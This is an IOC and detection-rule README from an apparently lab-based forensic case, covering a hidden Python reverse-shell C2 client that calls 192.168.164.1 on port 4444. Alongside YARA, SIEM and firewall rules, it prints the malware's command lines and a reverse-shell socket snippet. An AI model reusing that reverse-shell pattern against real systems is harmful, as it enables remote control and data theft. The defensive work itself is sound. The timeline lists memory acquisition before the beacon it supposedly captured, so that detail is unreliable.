# IOCs Directory
## Indicators of Compromise & Detection Rules | CASE_20251228_0001

**Case ID**: CASE_20251228_0001  
**IOC Generation Date**: 2025-12-31  
**Threat Level**: CRITICAL  
**Expected Use**: Enterprise threat hunting, network-wide IOC sweep, incident response

---

## Purpose

The `iocs/` directory contains structured, machine-readable Indicators of Compromise (IOCs) extracted from forensic analysis. These indicators enable:

- **Threat hunting** across enterprise infrastructure
- **Endpoint detection** via EDR/SIEM platforms
- **Network detection** via IDS/firewall rules
- **YARA-based memory scanning** for similar malware
- **Automated response** (block/quarantine/alert)

## Directory Contents

| File | Description |
|------|-------------|
| indicators.txt | Structured IOC list with categories and detection methods |
| iocs-README.md | This documentation file |
| yara-rules.yar | YARA detection rules for malware scanning |

---

## IOC Categories

### 1. **File System IOCs**

#### Hidden Malware Files
```
/opt/.cache/.rsim.py              [Python C2 client]
/opt/.cache/.memmarker.py         [Support tool]
/var/log/.rsim.log                [C2 activity log]
/var/log/.injector.log            [Injection mechanism log]
```

**Detection Method**:
```bash
# Find all hidden files in suspicious directories
find /opt/.cache -name '.*' -type f
find /var/log -name '.*' -type f
```

**Ownership**: All root (UID 0)  
**Permissions**: Variable (typically 644 or 755)

#### File Hashes
```
.rsim.py:        [SHA256 - to be computed from filesystem]
.memmarker.py:   [SHA256 - to be computed from filesystem]
.injector:       [SHA256 - binary hash]
```

### 2. **Network IOCs**

#### C2 Server Infrastructure

| Indicator | Value | Context |
|-----------|-------|---------|
| **Destination IP** | 192.168.164.1 | Attacker C2 server |
| **Destination Port** | 4444 | Custom reverse shell protocol |
| **Protocol** | TCP | IPv4 only |
| **Direction** | Outbound | Victim -> Attacker |

**Detection Rule** (Firewall/IDS):
```
Alert when:
  - Protocol: TCP
  - Destination Port: 4444
  - Any source (for network-wide sweep)
  - Alert on ESTABLISHED connections (active C2)
```

**Network Signature**:
```
Outbound TCP connection attempt to 192.168.164.1:4444
Source: Any internal IP
Expected behavior: Alert and block
```

#### Socket-Level IOCs

```
Victim IP:      192.168.164.129
Victim Port:    47540 (ephemeral - varies per connection)
Attacker IP:    192.168.164.1
Attacker Port:  4444 (fixed)
State:          ESTABLISHED
```

### 3. **Process IOCs**

#### Process Name Pattern IOCs

```
Command-line argument patterns:
  python3 /opt/.cache/.rsim.py [IP] [PORT]
  python3 /opt/.cache/.memmarker.py
  .injector [no visible args]
  
Execution context:
  sudo nohup [script] [args]
  User context: root (UID 0)
  SUDO_USER: labadmin (privilege escalation evidence)
```

**YARA-Style Detection**:
```
rule Malicious_Python_C2_Command_Line {
    strings:
        $s1 = "/opt/.cache/.rsim.py"
        $s2 = "192.168.164.1"
        $s3 = "4444"
    condition:
        all of them
}
```

#### Process Behavior IOCs

```
Process name begins with dot (.)
Hidden from standard process listing
Creates connections to external IP:port
Writes logs to hidden files in /var/log/
Runs as root (UID 0)
```

### 4. **Memory IOCs**

#### RWX Memory Signature

```
Process Behavior:
  - Anonymous memory mapping allocation (mmap)
  - Read-Write-Execute permissions (rwx) - rare and suspicious
  - Size: 4096 bytes (single memory page)
  - No file backing (not from library or executable)

Memory Pattern (x86-64):
  Signature: 4c 8d 15 f9 ff ff ff ff 25 03 00 00 00 0f 1f 00
  Interpretation: LEA r10, [rip-7]; JMP rel; NOP dword
  Classification: Position-independent code (PIC) shellcode
```

**Detection via Volatility 3**:
```bash
vol -f [memory.dump] -s [symbols] linux.malfind.Malfind \
  | grep -i "RWX\|rwx" | grep -v "mapped"
```

**YARA Memory Rule**:
```yara
rule RWX_Process_Injection_Shellcode {
    meta:
        description = "Detects RWX anonymous memory with PIC shellcode"
        case = "CASE_20251228_0001"
    
    strings:
        $sig = {
            4C 8D 15 F9 FF FF FF
            FF 25 03 00 00 00
            0F 1F 00
        }
    
    condition:
        $sig in (0..4096)  // Within single memory page
}
```

#### Memory String IOCs

```
"RWX_region_allocated=0x[addr] size=4096 shellcode_size=19"
"connected+beacon_sent"
"connect_fail ConnectionRefusedError"
"2025-12-27T21:49:05Z"
```

### 5. **Behavioral IOCs**

#### Python Reverse Shell Pattern

```python
import socket
s = socket.create_connection(("192.168.164.1", 4444), timeout=5)
# ... execute commands and send results back
```

**Detection Mechanism**:
- Monitor Python process execution with network parameters
- Alert on socket.create_connection() calls to external IPs
- Flag use of timeout parameter (evasion technique)

#### Privilege Escalation IOC

```
Command Pattern:  sudo nohup /path/to/malware [args]
User Transition:  labadmin -> root (via sudo)
Execution Context: Privileged execution without explicit password
Log Location:     /var/log/auth.log (sudo execution)
```

---

## IOC Distribution & Usage

### For Security Teams

#### Firewall Rule (Example)

```
Rule Name: Block CASE_20251228_0001 C2
Action: Block + Alert
Direction: Outbound
Protocol: TCP
Destination IP: 192.168.164.1
Destination Port: 4444
Log: Yes
```

#### SIEM/Splunk Query

```spl
index=network_traffic 
  destination_ip="192.168.164.1" 
  destination_port="4444" 
  transport=tcp 
  event_status=established
| stats count by source_ip, destination_ip
| lookup c2_iocs ip AS destination_ip
```

#### EDR/Endpoint Detection Rule

```
Condition: Process created
  Attributes:
    - Parent Process: sudo, nohup
    - Process Name: python3
    - Arguments contains: /opt/.cache/
    - User: root (UID 0)
    - Network: TCP connection to 192.168.164.1:4444
  Action: Quarantine + Alert + Block
```

### For Threat Intelligence

#### STIX Format IOC

```xml
<indicator id="indicator:CASE_20251228_0001-NetworkIOC">
  <indicators>
    <indicator>
      <file_name>/opt/.cache/.rsim.py</file_name>
      <type>File</type>
      <malware_type>Reverse Shell</malware_type>
    </indicator>
    <indicator>
      <destination_ipv4_address>192.168.164.1</destination_ipv4_address>
      <destination_port>4444</destination_port>
      <type>Network</type>
      <malware_type>C2 Server</malware_type>
    </indicator>
  </indicators>
</indicator>
```

---

## False Positive Mitigation

### Legitimate Uses of Similar Indicators

**Port 4444**:
- Metasploit handlers (red team testing)
- Custom application servers
- Educational labs

**mitigation**: Whitelist legitimate 4444 usage in your environment

**Python with Network Connections**:
- Web servers (Django, Flask)
- System monitoring tools
- CI/CD automation

**Mitigation**: Baseline legitimate Python processes; alert only on suspicious combinations

**RWX Memory**:
- JIT compilers (Python, JavaScript, Java)
- Some legitimate system tools

**Mitigation**: Flag RWX in user-space processes; tolerate in kernel/libraries

---

## Temporal IOCs

### Timeline Markers

```
2025-12-27 19:02:00 UTC  System boot
2025-12-27 21:49:00 UTC  (approx.) Malware deployment
2025-12-27 21:49:05 UTC  C2 beacon sent
2025-12-27 21:49:03 UTC  Memory acquisition (evidence freeze)
2025-12-30 onwards       Potential attacker access (until remediation)
```

**Use Case**: Correlate system logs with these timestamps to identify compromise scope

---

## IOC Automation

### OpenIOC Format

```
[Available for integration with OpenIOC-compatible tools]
[Format: Parseable by Mandiant iTest and similar platforms]
```

### YARA Rules Integration

All memory-based IOCs provided in YARA format for easy integration:
- Copy .yar files to YARA rule directories
- Use with volatility3_yara plugin
- Integrate with Zeek, Splunk, ELK, etc.

### Shodan/Similar Platform Queries

```
port:4444 
  (Ubuntu OR linux) 
  (python OR reverse OR shell)
```

(Note: This is a private network address, not searchable on public Shodan)

---

## IOC Lifecycle & Refresh

**Current IOCs**: Valid from 2025-12-31 onwards  
**Refresh Frequency**: Recommended daily (until incident is resolved)  
**Deprecation**: Mark deprecated when attacker infrastructure is dismantled

### Why IOCs Evolve

- Attacker may move C2 to new IP/port
- Malware variants may use different file paths
- New persistence mechanisms may emerge
- False positive refinement

---

## Sharing IOCs Safely

### Before Sharing Externally

- [ ] Redact internal IP addresses (use CIDR notation if sharing patterns)
- [ ] Redact internal file paths (use examples instead)
- [ ] Confirm legal clearance (Law enforcement, legal team)
- [ ] Add appropriate classification level (TLP:GREEN recommended)

### Recommended Recipients

- [ ] Relevant ISACs (Information Sharing and Analysis Centers)
- [ ] FBI Cyber Division / Law Enforcement
- [ ] Industry peers in same sector
- [ ] Threat intelligence partners with GDPR/legal compliance

---

## Reference & Verification

**All IOCs sourced from**: 
- Volatility 3 plugin outputs (`analysis/outputs/`)
- Forensic memory analysis (`.lime` file)
- Manual verification against FINAL_P2_EXAMINATION_COMPLETE.md

**Confidence Levels**:
- [Definitive] (direct kernel evidence): Network IOCs, Process IOCs, Memory IOCs
- [High] (recovered artifacts): File system IOCs, Behavioral patterns
- [Medium] (inferred): False positive mitigation strategies

---

**IOC Directory Status**: COMPLETE  
**Next Step**: Deploy to SIEM/Firewall/EDR platforms  
**Review Cycle**: Daily during active incident response  

